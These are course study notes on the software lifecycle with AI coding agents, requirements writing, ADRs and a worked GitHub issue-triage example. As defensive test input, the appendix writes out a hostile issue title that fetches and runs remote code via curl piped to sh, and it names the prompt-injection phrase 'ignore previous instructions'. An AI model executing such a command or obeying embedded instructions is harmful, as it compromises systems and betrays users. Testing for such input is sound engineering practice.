# Reading notes: W1-W2

## W1: Why this course exists

> The W1 readings (Naur, ReactBench, Demirer et al., Ng) are summarised from the syllabus. Skim the originals if you have time.

## Writing code is cheap; specifying and verifying are not

**Core premise.** AI lowers the cost of *generating* code. Value shifts to
**specifying** what to build and **verifying** that what was built is right.

**Two threads / two objects of trust**

| Thread | Object | Question |
| --- | --- | --- |
| **T — Tool trust** | the agent / coding tool | Can I trust what the agent *did for me* (its diff, its claim "tests pass")? |
| **C — Capability trust** | the product that *contains* AI | Can I trust a stochastic capability we *ship* to users? |
| Example: reviewing the agent's diff in Exercise B = T. Deciding whether the |  |  |
| LLM's `severity` is good enough to drive escalation = C. |  |  |

**Naur (1985), Programming as Theory Building.** A program is the visible
by-product of a *theory* held in programmers' heads: how the code maps to the
world, why each part is what it is, and how to change it in response to new
demands. That theory **cannot be fully written down**. Consequences: a program
"dies" when its team disbands; modification by people without the theory
decays the design. AI angle: if an agent writes the code, who holds the theory?

**ReactBench.** Agents can **pass behavioural tests and still introduce real
defects**. Tests check *behaviour*; they miss *quality attributes*
(maintainability, security, performance, consistency). "All tests pass" ≠
"good change". Syllabus question: what if quality attributes were tested
automatically inside the agent loop?

**Demirer et al. (2026), "writing code vs shipping code".** AI's productivity
gains in *writing* code don't translate one-to-one into *shipped* code. Review,
integration and verification become the bottleneck.

**Ng's AI Engineering Skills Map.** SE fundamentals stay essential for AI
developers.

**W1 lab lesson.** A one-sentence brief ("build a tool that produces a
structured triage record…") forces dozens of *unspecified decisions* (fields,
enum values, what to do on bad model output, what "confidence" means). Two
implementations of the same brief diverge. The agent's PR claim "All tests
pass, CI is green" is a claim *by the party under review*.

---

## W2 · Part 1 — The Software Lifecycle (SDLC) And What AI Changes

Read top to bottom, about 45 minutes. Every idea is explained in plain words with
an example from the course's running example, the **GitHub issue-triage system**
(an AI reads a GitHub issue and labels it: bug or feature, how severe, and so
on; then fixed rules send it to the right team).

Sources: the lecture slides `SDLC AI.pdf` (part 1), the course syllabus and the
spec examples in the course repo (part 2). Part 2 topics were not in the slides
you have, so they are explained from the syllabus list of W2 topics.

> ⚠️ Slides 34–39 of the PDF are the answer key for lab Exercise B. Skip them
> until you have done Exercise B Part 1.

---

## 1.1 What is a methodology?

A **software development methodology** is the agreed way a team organises
building software:
- **which** activities happen
- in **what order** and rhythm
- done **by whom**
- producing **which artifacts** (documents, code, tests…)
- and **how quality is checked** along the way.

Examples of process models: **waterfall** (each phase once, in order),
**incremental** (build in slices), **agile** (short cycles, frequent feedback),
**Unified Process**. The key question each one answers differently:
*when do you commit to a decision, and how much does it cost to undo it?*

## 1.2 The SDLC stages and what each produces (slide 41 — memorise this table)

| Stage | Main output (artifact) |
| --- | --- |
| **Plan** | Requirements spec, user stories, acceptance criteria |
| **Design** | Architecture, ADRs, API contracts, data model, platform choice |
| **Build** | The codebase, build configuration |
| **Test** | Test suites, pass/fail results, coverage |
| **Deploy** | CI/CD pipelines, infrastructure-as-code, release artifacts |
| **Maintain** | Bug fixes, patches, monitoring, runbooks, postmortems |

**Phase boundary = verification checkpoint.** When you move from one stage to
the next, you check the new artifact against the previous ones *for the same
requirement*: does the design satisfy the requirement? does the code match the
design? do the tests actually test the requirement?

## 1.3 The hidden assumptions of the classic SDLC (slide 42)

The traditional SDLC quietly assumes:
1. **Coding is expensive**, so the process tries to save coding effort.
2. **Code is the source of truth.** Specs drift away from it, and links between spec and code are hard to keep up.
3. **Behaviour is deterministic**, so a **test oracle** exists: for a given input you know the one right output.
4. **Dependencies change only when we upgrade them.**

**AI coding agents break these assumptions.** Code becomes cheap, the spec
becomes the important thing, and AI inside the product is *not* deterministic
(the same input can give different outputs).

## 1.4 SDLC with AI coding agents (slides 43–50)

Same stages, but **the agent writes most of the code** and **humans focus on
the two ends: specifying and verifying.** The question at every stage:
*what must a person own so we can trust what the agent produces?*

| Stage | Traditional | With coding agents — what's new | Why |
| --- | --- | --- | --- |
| **Plan** | Requirements spec | **Executable spec** (change proposals, task breakdowns, explicit acceptance criteria), the main human-owned artifact | A human reading a spec fills gaps with common sense. An agent *executes* the spec and fills gaps with **guesses**. |
| **Design** | Architecture, ADRs, contracts | **+ Agent context**: rules/conventions files (like `CLAUDE.md`), skills, tool permissions | Design now constrains *two* builders: the product *and* the agent building it. |
| **Build** | Codebase | **+ Provenance**: agent session logs, PRs with review records (who or what wrote it, who approved it) | Code is cheap; the human job shifts from writing to **reviewing diffs**. Review becomes the bottleneck. |
| **Test** | Tests with a deterministic oracle | **Independent acceptance tests**, derived from the spec and owned by humans | If the agent writes both code and tests, it **grades its own work**: tests confirm what was built, not what was required. |
| **Deploy** | CI/CD, infrastructure as code | **+ Approval gates** (where a human must sign off) and an **agent permission policy** (what an agent may merge or deploy alone) | Deploy is a **trust boundary**, not just automation. |
| **Maintain** | Patch the code, maybe update docs | **Spec-first changes**: update the spec, then regenerate or amend the code; plus **spec–code drift checks** | Maintenance becomes a loop between spec and code. |

**One-line summary:** with agents, *specs and verification* become the human
work; *code* becomes the cheap, regenerable part.

## 1.5 Second shift: AI *inside* the product (slides 51–52)

Different from "AI helps build software". Here an LLM runs **inside** what you
ship (like the triage tool calling Gemini). Three new problems:
- the component is **non-deterministic**
- its interface is **natural language**
- the **AI supplier keeps changing** (you saw this yourself: Google retired `gemini-2.5-flash`)

So each stage adds new artifacts:

| Stage | Extra for AI-at-runtime products |
| --- | --- |
| Plan | Behavioural targets (quality *rates*, e.g. "≥ 85 % correct"), risk classification, a **golden dataset** |
| Design | Model choice, guardrails, **fallbacks**, **human-in-the-loop** points, cost/latency budgets |
| Build | Prompts, retrieval indexes, data pipelines, tool definitions, **pinned model versions** |
| Test | **Eval suites**: datasets, rubrics, LLM-as-judge (validated), red-teaming, prompt-injection tests, *statistical* pass rate |
| Deploy | Version model + prompts + data **together**; canary/shadow rollout; model/system cards |
| Maintain | Continuous monitoring, online evals, drift; **a model upgrade is a regression you didn't trigger** |

Key insight: for AI components, testing gives a **rate** ("correct on 87 % of the
dev set"), not pass/fail.

## 1.6 Quality criteria for generated code (slide 33)

"It works" is not enough. Criteria the lecture listed: compiles and runs · well
typed · tested and covered · sound architecture · modularity · separation of
concerns · extensible · scalable · performance · operating cost · **meets the
specification** · **verifiable** · safe.

Link to W1: ReactBench showed agents passing every behavioural test while still
failing quality attributes (performance, accessibility). **Tests check
behaviour; they often miss quality.**

## 1.7 Spec-driven development (slide 53)

Approaches where the spec leads and the code follows (from Martin Fowler's
article on the topic):
- **Spec-first**: write the spec before the code.
- **Spec-anchored**: the spec is kept and updated alongside the code.
- **Spec-as-source**: the spec *is* the source; code is generated from it.

Tools: **OpenSpec**, Kiro. The course's triage example has an OpenSpec version
(change proposal → spec delta with GIVEN/WHEN/THEN scenarios → design → tasks).

---

## W2 · Part 2 — Requirements (The Core Of W2)

## 2.1 Need vs requirement vs design decision ⭐ (very likely quiz question)

|  | What it is | Triage example |
| --- | --- | --- |
| **Need** | The stakeholder's **problem in the real world**. Says nothing about software. | "Maintainers waste time reading every new issue to see if it's theirs." |
| **Requirement** | An **observable property** the system must have to address the need. Says *what*, not *how*. | "Every issue gets an `issue_type` from {bug, enhancement, documentation, question, meta}." |
| **Design decision** | **How** we chose to meet the requirement. Could have been done differently. | "Use DSPy to call the model." "Validate with Pydantic." "Retry once." |

**Mistake to spot:** a design decision written as a requirement, e.g. the user
story "As a developer I want GPT-4 with temperature 0 and a regex parser" (from
the course's flawed-spec exercise). That's a *how*, not a *what*.

## 2.2 Jackson — "The World and the Machine" (1995)

- Requirements live in the **world** (the problem domain: maintainers, issues, teams), **not in the machine** (the software).
- The machine touches the world only through **shared phenomena**: things both sides can see, such as an issue being submitted or a label being written.
- A **specification** describes the machine's behaviour at that interface.
- Correctness argument: **specification + domain knowledge ⇒ requirement** (S + W ⇒ R).
- Example: the spec says "issues with type `bug` go to the engineering queue". Domain knowledge says "the engineering team reads the engineering queue". Together these satisfy the requirement "bugs reach engineers".
- If the domain assumption is false (nobody reads that queue), perfect software still fails the requirement.

## 2.3 Formats for writing requirements

### (a) SRS — Software Requirements Specification (ISO/IEC/IEEE 29148)

A formal document of numbered **"shall"** statements. Typical sections:
purpose, scope, definitions, user classes, constraints, then specific
requirements. Each requirement has an **ID**, a **priority** (Must/Should) and a
**verification method** (Test, Inspection, Analysis, Demonstration).

Example from the course: *FR-R-04 — A bug without reproduction steps shall be
routed to `triage-clarify`. Priority: Must. Verification: Test.*

**Good for:** audits, contracts, traceability. **Cost:** long, and it goes stale.

### (b) Use case

Describes an **interaction** between an actor and the system to reach a goal.
Parts (learn this list):
- **Actor**: who interacts (e.g. triage operator)
- **Goal**
- **Preconditions**: what must be true *before* (e.g. an API key is configured, the issue exists)
- **Main (success) flow**: numbered steps when everything goes right
- **Alternate / exception flows**: what happens when something differs or fails (e.g. "5a. the model returns an invalid type → retry once → still invalid → mark as failure")
- **Postconditions**: what is true *after* (e.g. exactly one record is printed)

**Good for:** behaviour with many error paths.

### (c) User story

One sentence: **As a ⟨role⟩, I want ⟨capability⟩, so that ⟨benefit⟩.**

> As a **maintainer**, I want **each new issue labelled with its type and
> severity**, so that **I don't have to read every issue to know if it's mine**.

Plus **acceptance criteria** in **Given / When / Then** form:

> **Given** severity `high` and confidence 0.59, **when** routing runs, **then** the issue is escalated.
> **Given** severity `high` and confidence exactly 0.6, **then** it is **not** escalated.

(Testing exactly at the boundary, 0.6, is a classic good criterion.)

**INVEST**: what makes a good story:

| Letter | Meaning |
| --- | --- |
| **I**ndependent | can be built without waiting for another story |
| **N**egotiable | details can still be discussed; not a contract |
| **V**aluable | gives value to a real user |
| **E**stimable | the team can estimate its size |
| **S**mall | fits in one iteration |
| **T**estable | has clear acceptance criteria |

Bad story: "As a user, I want issues triaged automatically so that things are
better." No real role, no measurable benefit, and **not testable**.

The course's note: **stories are "sufficient for a conversation, not for an
implementation."** An agent would still have to guess a lot.

### When to use which?

SRS → formal, audited, many requirements to trace. Use case → interaction with
many failure paths. User story → agile backlog, conversation with users.
Executable spec (OpenSpec) → handing precise work to an agent.

## 2.4 Classifying requirements ⭐

| Class | Question it answers | Triage example |
| --- | --- | --- |
| **Functional requirement (FR)** | What does the system **do**? | "A failed triage is routed to `triage-manual`." |
| **Quality attribute (QA)**, also called non-functional | How **well** does it do it? (accuracy, speed, security, reliability, maintainability…) | "`issue_type` macro-F1 ≥ 0.75 on the held-out split." "Issue text is never passed to a shell." |
| **Constraint** | A **limit on the solution** that isn't negotiable | "Python 3.13, managed with uv." "Must pass pyright strict." "Must use DSPy." |

Tip: if it restricts *how you're allowed to build it* → constraint. If it says
*what happens* → functional. If it says *how good / fast / safe* → quality
attribute.

## 2.5 Quality criteria for a single requirement ⭐

A good requirement is:
- **Unambiguous**: only one possible reading. ✗ "Important issues must be escalated quickly": what is "important"? what is "quickly"?
- **Consistent**: doesn't contradict another requirement. ✗ "Bugs go to engineering" together with "critical issues always go to on-call": where does a critical bug go?
- **Atomic**: one thing per requirement. ✗ "The system should be fast and secure" is two requirements.
- **Prioritized**: Must / Should / Could.
- **Verifiable**: there is a finite, objective check (test, inspection, analysis, demonstration). ✗ "Severity should be determined accurately." ✓ "Severity agrees within one level with the gold label on ≥ 85 % of the held-out split."

**How to fix a vague requirement:** replace the vague word with a number, a
named dataset, or a precise rule.

## 2.6 Planguage — making quality requirements measurable

(Tom Gilb's notation; reading by E. Simmons.) A quality requirement gets named
fields so "fast" becomes a number:

| Field | Meaning | Example |
| --- | --- | --- |
| **Tag** | short name | `Triage.Latency` |
| **Gist** | one-line intent | "triage feels instant" |
| **Scale** | the unit of measure | seconds per issue |
| **Meter** | how you measure it | time 100 dev issues, take the 95th percentile |
| **Must** | the minimum acceptable | ≤ 10 s |
| **Plan** | the target | ≤ 3 s |
| **Wish** | the ideal | ≤ 1 s |
| **Past** | the current baseline | 4 s |

## 2.7 Traceability ⭐

A **traceability matrix** links each requirement → design (ADR) → code →
test. Example row: *US-06 (escalation story) ↔ FR-R-05 ↔ ADR-0005 ↔
`router.py` ↔ `test_escalation_boundary`.*

Two uses:
- **Coverage**: does every requirement have code *and* a test?
- **Impact analysis**: if a requirement changes, which design, code and tests must change too?

Weakness: **hand-maintained traceability rots.** People forget to update it
when the code changes. That's why the course later wants it checked
automatically.

## 2.8 Change management

- Requirements are **volatile**: they change.
- Uncontrolled additions = **scope creep**.
- **Change control**: propose the change → analyse its impact (using traceability) → decide → update the artifacts.
- "**The specification is wrong**" is a *normal* event, not a disaster. Course example: the spec says a critical bug without reproduction steps should go to `triage-clarify` **and** be escalated, but the code never escalates it. Which one is right? It's an open question to decide and record.

## 2.9 ADR — Architecture Decision Record ⭐

A short file recording **one important design decision and why**. Sections:

1. **Title**: "ADR-0001: Separate LLM extraction from deterministic routing"
2. **Status**: Proposed / Accepted / Superseded
3. **Context**: the forces and the problem
4. **Decision**: what we chose
5. **Consequences**: positive *and* negative
6. *(often)* **Alternatives considered** and why they were rejected

**Why keep ADRs if you have a spec?** The spec says **what**; the ADR records
**why** this option was chosen and what was rejected. That reasoning is lost
six months later otherwise. ADRs are not edited: you write a new ADR that
**supersedes** the old one.

The 5 course ADRs for triage (good examples to remember):

| ADR | Decision | Core reason |
| --- | --- | --- |
| 0001 | The LLM extracts attributes only; **routing is plain rules, no model** | Policy must be explainable, testable and changeable without touching a model |
| 0002 | **Validate strictly, never coerce** model output (`1.3` is rejected, not rounded to `1.0`) | Each "repair" is a hidden guess; rejecting keeps the failure rate visible |
| 0003 | Use **DSPy** signatures, not hand-written prompts | Model swaps become configuration; prompts can be optimised later |
| 0004 | **Issue text is untrusted data** | Strangers write issues; at least one contains a shell-command attack |
| 0005 | **Escalate** high-severity issues when model confidence < 0.6 | Missing a real outage costs far more than a human checking a false alarm. The threshold is provisional because LLM confidence isn't calibrated. |

---

## W2 · Part 3 — The Running Example In One Picture

```
GitHub issue (untrusted text)
      │
      ▼
 LLM extraction (DSPy, no tools)        ← AI part: probabilistic
      │  issue_type, component, severity, has_reproduction_steps, confidence
      ▼
 Strict validation (Pydantic)            ← invalid → retry once → still invalid → TriageFailure → "triage-manual" queue
      │
      ▼
 Router: pure rules, no AI               ← deterministic: queue + SLA + escalate
```

- Queue by type: bug → engineering, enhancement → product, documentation → docs, question → support, meta → maintainers. **A bug without repro steps → `triage-clarify`.**
- SLA by severity: critical 4 h · high 24 h · medium 72 h · low 168 h.
- Escalate **iff** severity is critical, **or** severity is high **and** confidence < 0.6.

---

## W2 · Part 4 — Check Yourself (Cover The Answers)

1. Name the 6 SDLC stages and one artifact each.
2. Which classic SDLC assumption breaks when the product contains an LLM?
3. With coding agents, why must acceptance tests be owned by humans?
4. Need, requirement or design decision: "Use Pydantic to validate the output."
5. FR, quality attribute or constraint: "Must run on Python 3.13."
6. Make verifiable: "The system should be fast."
7. List the parts of a use case.
8. What does the T in INVEST mean, and why does it matter?
9. Two uses of a traceability matrix?
10. What does an ADR record that a spec doesn't?

### Answers

1. Plan (requirements spec) · Design (architecture/ADRs) · Build (code) · Test (test suites) · Deploy (CI/CD) · Maintain (patches, monitoring).
2. Determinism, so there's no single test oracle (also "dependencies change only when we upgrade": the model supplier changes it for you).
3. Otherwise the agent grades its own work; tests would confirm what was built, not what was required.
4. Design decision (it's *how*).
5. Constraint.
6. e.g. "95th-percentile triage time ≤ 3 s per issue over 100 dev issues" (Planguage: Scale = seconds, Meter = p95 over 100 issues, Must = 3 s).
7. Actor, goal, preconditions, main flow, alternate/exception flows, postconditions.
8. Testable: it has acceptance criteria, so you can tell objectively when the story is done.
9. Coverage (every requirement has code and a test) and impact analysis (what changes when a requirement changes).
10. *Why* the decision was made, the alternatives rejected, and its consequences.

## The labs: what they were for

Read this after the W2 study guide. The study guide teaches the *terms*; this sheet shows how the labs *use* them. Quizzes ask about ideas, not code, so every section ends with "what the quiz could ask".

---

### The one idea behind every lab

An LLM is a **stochastic** (random, unreliable) component. Software around it must be **deterministic** (same input → same output, either right or wrong).

So the job of an engineer is to build a **contract** at the border between the two:

```
 GitHub issue ──► [ LLM: guesses fields ] ──► [ VALIDATION / CONTRACT ] ──► [ Router: pure rules ]
   untrusted         stochastic                 TriageRecord (strict)          deterministic
```

- Left of the contract: anything can come out ("High", "feature-request", confidence 1.3).
- Right of the contract: only valid values exist, so ordinary code and tests work.
- **Every bug in Exercise B is someone going around the contract.**

---

### Lab W1, Exercise A: build triage

**Task:** one GitHub issue in, one validated `TriageRecord` out (type, component, severity, has-repro, confidence).

| What we built | Why (the concept) |
| --- | --- |
| Pydantic schema with `strict`, `extra="forbid"`, ranges | The **contract**. Invalid model output is rejected, not guessed. |
| Retry once, then emit `TriageFailure` | Failure is **explicit**. "We don't know" is data too, never a silent default. |
| `repo` and `number` copied from input, never from the model | Facts we already know must not be **re-predicted**. The model can hallucinate them. |
| Issue text passed only as a value, never to a shell | Issue text is **untrusted input** (prompt injection, command injection). |
| A stub LM (`DummyLM`) in tests | Tests must be **deterministic and free**. The real model is neither. |
| `test.json` sealed, refused by the CLI | Keep a held-out set **nobody has looked at**, so later evaluation is honest. |
| Run on 20 dev issues and write "surprises" | Learn to **look at the output**, not trust "it ran". |

**What the surprises taught:**
- **Confidence was ~1.0 even when wrong.** Model self-reported confidence is not *calibrated*, so you can't build rules on it without measuring it.
- **"Run it on 20 issues" took the first 20, all one repo.** The spec was ambiguous and the agent guessed. That is a `spec` failure, not a model failure.
- **Rate-limit errors looked like model errors.** Different failure causes need different failure types.
- **Severity and component have no gold labels.** We **cannot verify** the fields routing depends on most.

**What the quiz could ask:**
- "Why validate LLM output instead of trusting the type hints?" Because types are a promise the model never signed; only runtime validation checks what actually came back.
- "Why take the issue number from the input?" Known facts shouldn't be predicted.
- "What is a test split for, and why seal it?" It gives an unbiased final measurement. If you look at it, you start tuning to it.
- "Why is a confidence of 0.95 not evidence?" It was never checked against reality (no calibration).

---

### Lab W1, Exercise B: review an agent's change

**Setup:** you got a second triage implementation (`triage_by_agent`), plus a diff where an agent added routing and a batch mode. The agent said: *"All tests pass, CI is green."*

- **Part 1:** find problems by **reading only**.
- **Part 2:** run pytest, pyright and the program, and see what the tools add.

**The point:** measure what reading catches versus what tools catch. The seeded defects are chosen so that **the tools miss most of them**.

#### The 5 seeded defects, in plain words

| # | Defect | Plain explanation | Did tools catch it? |
| --- | --- | --- | --- |
| 1 | `route()` vs `route_raw()` | The agent wrote a second, "fast" router that skips validation and drops two business rules. The same issue is routed differently in a batch. | No |
| 2 | Severity case | The model says `"Critical"`, the lookup wants `"critical"`, the miss falls back to 72 h. A critical issue gets 3 days instead of 4 hours, **silently**. | No (the stub only emits lowercase) |
| 3 | `ticket_priority` | A second name for `severity`. The package explicitly says "one concept, one name". | No (no tool sees naming) |
| 4 | `levenshtein_fast` | A package that is not the real one (typosquat risk), not declared, error hidden by `# type: ignore`. | Partly: pyright gave 1 error; the batch crashed |
| 5 | No logging, spec or metric | Nothing records why an issue was routed somewhere; "correct" is never defined. | No |

**Two more real problems** (not seeded, found anyway):
- A `shell=True` command built from the issue title, which is **command injection**.
- Issue numbers repeat across repos, but duplicate detection keys on number only.

#### Results (in `review-findings.md`)

|  | Seeded defects found |
| --- | --- |
| Tools alone (pytest + pyright + run) | 1 of 5 (20%) |
| Reading | 5 of 5 |

pytest: **20/20 green** while the code was broken.

#### Why the tools missed it (memorise this, it's the lesson)

1. **The agent wrote its own tests**, so the tests share its blind spots. They are all lowercase and use ≤ 1 issue.
2. **The stub hides the hole.** The offline stub produces clean, validated values, so it never sends `route_raw` the messy values a real model would.
3. **Meaning is invisible to tools.** Two policies, a synonym, a silent default: they're all syntactically fine.
4. **"Green CI" is evidence only about what was tested.** Coverage of the *risky* path is what matters.

#### Compare the two implementations (also part of the exercise)

|  | Mine (`src/triage`) | Theirs (`triage_by_agent`) |
| --- | --- | --- |
| `"High"` from the model | rejected, retried | normalised to `"high"` (lenient coercion) |
| confidence `1.3` | rejected | clamped to 1.0 |
| confidence `"abc"` | rejected | becomes 0.0 |
| invalid output twice | `TriageFailure` record | raises an exception |

Neither is "right". It's a **design decision** about strict vs lenient validation. Good quiz material: *normalising case is safe; clamping 1.3 hides that the model is broken.*

**What the quiz could ask:**
- "CI is green. Why might you still reject the PR?"
- "Name a defect a type checker cannot find." (naming/vocabulary, policy divergence)
- "What is a typosquatting / supply-chain risk?"
- "Why can a test stub hide bugs?"
- "What is *ubiquitous language*?" One agreed name per domain concept, used everywhere (from Domain-Driven Design).

---

### W2: requirements the W1 build silently assumed (exercise from the syllabus)

> The actual W2 lab, held on 3 Nov, was the **specifications lab** (SRS vs user stories,
> OpenSpec, composing changes). See [`../W2/TAKEAWAYS.md`](../W2/TAKEAWAYS.md). This section
> covers the exercise the syllabus describes for W2. The worked answer is in the appendix below.

**Task:** the only stated requirement was one sentence: *"read an issue, produce a triage record, so issues can be routed automatically"*. List every requirement the W1 code **actually** assumed, classify each one, and ask: **can it be verified?**

What the worked example (appendix) contains:
- **Need → requirement → design decision**:
- need: maintainers waste time reading issues.
- requirement: each issue yields a typed record.
- design decision: DSPy, Gemini, retry once.
- **Use case UC-1**: actor, preconditions, main flow, exception flows (rate limit, invalid output, hostile text).
- **User story US-1** with Given/When/Then acceptance criteria.
- **22 requirements**, each marked FR (functional) / QA (quality attribute) / C (constraint) and **verifiable or not**.

**The key finding:**
- The brief stated 1 requirement, and the code assumed about 20.
- The ones you **can't verify** (severity correct? component correct? accuracy "good enough"?) are exactly the ones routing depends on.
- Fix: make them measurable, e.g. *"issue\_type accuracy ≥ 0.85 on dev"* (Planguage style: scale, meter, target).

**This connects to Exercise B:** defect #5 ("no specification, no metric") is the **same problem**. Without a written requirement, a reviewer can't say the batch path is *wrong*, only that it's *different*.

**What the quiz could ask:**
- "Is 'use Gemini' a requirement?" No, it's a design decision; the requirement behind it is whatever property you need from the model.
- "Make 'triage should be accurate' verifiable."
- "Classify: 'output must pass pyright strict'." Constraint.
- "Why write acceptance criteria before the code?" So whoever writes the code doesn't also write the definition of done (the Exercise B failure).

---

### One-paragraph summary to remember

> An LLM is an unreliable component, so we put a strict **contract** (validated schema) between it and the deterministic code, and make failure **explicit**. Agents (and people) break the contract when they "optimise" around it, as in Exercise B, and tests written by the same author plus a clean stub won't notice. Only **reading against a specification** catches that, and the specification must be **verifiable**, which is what W2 is about.

## Appendix: worked requirements example

> A worked example: the requirements the W1 triage build implicitly assumed (written by Claude as study material; not an official handout).

**The only stated requirement (the brief):** "Build a tool that reads a GitHub
issue and produces a structured triage record, so that incoming issues can be
routed automatically instead of by hand."

- **Need** (in the world): maintainers spend time reading every new issue to decide what it is and who should handle it.
- **Requirement** (observable property): each issue yields a typed record that a router can act on.
- **Design decisions** (not requirements): DSPy, Pydantic, Gemini, temperature, retry count, JSON-lines output. These are listed in `docs/decisions.md`, and the ones with lasting impact belong in ADRs.

---

### 1. Use case — UC-1 Triage one issue

| Field | Content |
| --- | --- |
| **Primary actor** | Triage operator (runs the CLI); downstream: router |
| **Stakeholders** | Maintainers (receive routed issues), triage lead (owns routing policy), evaluator |
| **Goal** | Turn one GitHub issue into a validated triage record |
| **Trigger** | Operator runs `python -m triage.cli` with an issue reference |
| **Preconditions** | `LLM_MODEL` and a matching API key are configured; the issue exists in `train`/`dev` or in a given JSON file; the issue has a positive number and a title |
| **Postconditions (success)** | Exactly one `TriageRecord` is printed, with `repo`/`number` equal to the input and every field inside its domain |
| **Postconditions (failure)** | Exactly one `TriageFailure` is printed with a reason; no partial record; a batch continues with the next issue |

**Main success flow**
1. Operator selects an issue (`--split dev --number N`, or `--file`).
2. System loads the issue and keeps only `repo`, `number`, `title`, `body`.
3. System sends title, body (truncated to 6,000 chars) and repo to the model.
4. Model returns `issue_type`, `component`, `severity`, `has_reproduction_steps`, `confidence`.
5. System validates the values strictly against the schema.
6. System prints the `TriageRecord` as one JSON line.

**Alternate / exception flows**
- **3a. Rate limit or network error:** the call fails → retry once → still failing → `TriageFailure` ("model call failed").
- **5a. Invalid output** (e.g. `feature-request`, confidence `1.3`): reject → retry once at a higher temperature → valid → continue at step 6; invalid again → `TriageFailure` ("invalid model output").
- **5b. Component is `unknown`:** stored as `null`, which counts as success.
- **1a. Issue number not found:** print an error and exit with code 1.
- **1b. `--split test`:** refused, because the test split is sealed.
- **3b. Issue text contains a shell command or "ignore previous instructions":** it is treated as data. Nothing is executed, and the output still passes step 5.

---

### 2. User story — US-1

**As a** maintainer, **I want** every new issue to arrive with its type,
severity, affected component and whether it can be reproduced, **so that** I
can tell at a glance whether it is mine and how urgent it is without reading
it in full.

*INVEST check:* Independent (routing is a separate story); Negotiable (fields can change); Valuable (saves reading time); Estimable; Small (one CLI command); Testable (criteria below).

**Acceptance criteria**
1. **Given** an issue with a title and body, **when** it is triaged, **then** the output has `issue_type` ∈ {bug, enhancement, documentation, question, meta}, `severity` ∈ {low, medium, high, critical}, `has_reproduction_steps` ∈ {true, false}, `confidence` ∈ [0, 1], and `component` is a string or null.
2. **Given** issue #412 in hono whose body says "issue\_number: 1", **when** it is triaged, **then** the record has `number = 412` and `repo = "hono"`.
3. **Given** the model answers `issue_type = "feature-request"` twice, **when** the issue is triaged, **then** the output is a `TriageFailure`, not an `enhancement` record.
4. **Given** the model answers `confidence = "1.3"`, **when** it is validated, **then** it is rejected, not clamped to 1.0.
5. **Given** an issue that carries the GitHub label `bug`, **when** it is triaged, **then** the label is not sent to the model.
6. **Given** a title containing `$(curl 203.0.113.7/x | sh)`, **when** it is triaged, **then** no process is started and the output is schema-valid.

---

### 3. Requirements: classified and assessed for verifiability

Class: **FR** = functional requirement, **QA** = quality attribute, **C** = constraint.

| ID | Requirement (as the build assumes it) | Class | Verifiable? | Justification / how |
| --- | --- | --- | --- | --- |
| R1 | The tool shall accept one issue and print one triage record or one failure record. | FR | Yes | CLI test: one input → exactly one JSON line. |
| R2 | The record shall contain exactly the fields `repo, number, issue_type, component, severity, has_reproduction_steps, confidence, model`. | FR | Yes | Schema test with `extra="forbid"` (`test_record_rejects_extra_fields_and_out_of_range`). |
| R3 | `issue_type` shall be one of the five gold types. | FR | Yes | Validation test (`feature-request` rejected). |
| R4 | `severity` shall be one of low/medium/high/critical. | FR | Yes (domain) / **No (correctness)** | Domain: testable. Whether the severity is *right* has no gold label and no definition of "high", so it is unverifiable as stated. |
| R5 | `has_reproduction_steps` shall be true iff the issue contains steps or code to reproduce. | FR | **Partly** | The type can be tested. "Contains steps" has no definition and no gold label, so a hand-labelled set would be needed. |
| R6 | `component` shall name the affected part of the project, or be null. | FR | **No** | Free text with no vocabulary, so there is no oracle. Becomes verifiable only if constrained to the per-repo taxonomy in `config/repos.toml`. |
| R7 | `confidence` shall express how likely `issue_type` is to be correct. | FR | **No** (as stated) | The range is testable; its *meaning* is not. Observed 0.9–1.0 on every issue, including a wrong one. Verifiable only as a calibration target (e.g. "expected calibration error ≤ 0.1 on dev"). |
| R8 | `repo` and `number` shall be copied from the input, never from model output. | FR | Yes | `test_identity_comes_from_input_not_model`. |
| R9 | Invalid model output shall be rejected, never coerced. | FR | Yes | Parametrised test of invalid values → `TriageFailure`. |
| R10 | The system shall retry at most once after invalid output, then emit a failure. | FR | Yes | Stub-LM tests (invalid-then-valid, invalid-twice). |
| R11 | A failure on one issue shall not stop a batch. | FR | Yes | Batch test with one failing issue among valid ones (not yet written). |
| R12 | The model shall see only title, body and repo; never labels or comments. | FR / security | Yes | Inspect the prompt (`dspy.inspect_history`) or assert on the stub LM's received input. |
| R13 | Issue text shall never reach a shell, a command or a file path. | QA (security) | Yes, by inspection plus a test | Grep for `subprocess`/`os.system`/`eval` in `src/triage`; hostile-title test. A test cannot *prove* absence; inspection covers the rest. |
| R14 | Instructions inside issue text shall not change behaviour. | QA (security) | **Partly** | Containment is verifiable (output is schema-only). Whether an injection *biases* the chosen values is not fully verifiable; it can only be measured on adversarial fixtures. |
| R15 | Triage shall be accurate enough to route automatically. | QA | **No** (as stated) | No threshold. Rewrite: "`issue_type` accuracy ≥ 0.85 on dev issues that have gold labels". Measured 9/10 on the spread sample, which is too small to claim anything. |
| R16 | Re-running on the same issue with the same model shall give the same record. | QA (reproducibility) | Yes, with conditions | Holds via temperature 0 plus the DSPy cache. It is not guaranteed by the provider without the cache. |
| R17 | A batch of 20 issues shall complete without rate-limit failures on the free tier. | QA (reliability) | Yes | Run with `--delay 4`: 0/20 failures. Depends on provider quota, an external domain property. |
| R18 | The code shall pass `uv run pyright` in strict mode. | C | Yes | Tool output: 0 errors. |
| R19 | The code shall be in `src/triage/`, run from the command line, and have a test under `tests/triage`. | C | Yes | Inspection plus `uv run pytest`. |
| R20 | The model call shall use DSPy. | C | Yes | Inspection. This is a design decision imposed as a constraint by the lab. |
| R21 | `test.json` shall never be read. | C | **Partly** | The CLI refuses it (testable). That no person or agent opened it is not verifiable from the code. |
| R22 | The record shall be good enough "so that issues can be routed automatically". | (need) | **No** | This is the need restated. It can only be verified with a router and an agreed routing policy, both out of W1 scope. |

#### What this shows

- **Never specified by the brief:** every item in R2–R12 and R14–R17. The brief fixes only R1 and the vague goal R22. Everything else was decided by the agent or by me and recorded in `docs/decisions.md`.
- **Unverifiable as stated:** R6, R7, R15 and R22, plus the correctness halves of R4 and R5. These are exactly the fields routing would depend on most (severity, confidence).
- **To make them verifiable:**
- Constrain `component` to the per-repo taxonomy.
- Define severity levels with examples and hand-label a gold set.
- State numeric accuracy and calibration targets on a named split (Planguage-style: Scale, Meter, Must, Plan).
- **Requirement versus design decision:** "retry once at temperature 0.7" and "use Gemini flash-lite" are design decisions. The requirement behind them is R10 (bounded retry, explicit failure). An ADR should record *why* one retry, not the requirement table.

### 4. Traceability (excerpt)

| Req | Code | Test |
| --- | --- | --- |
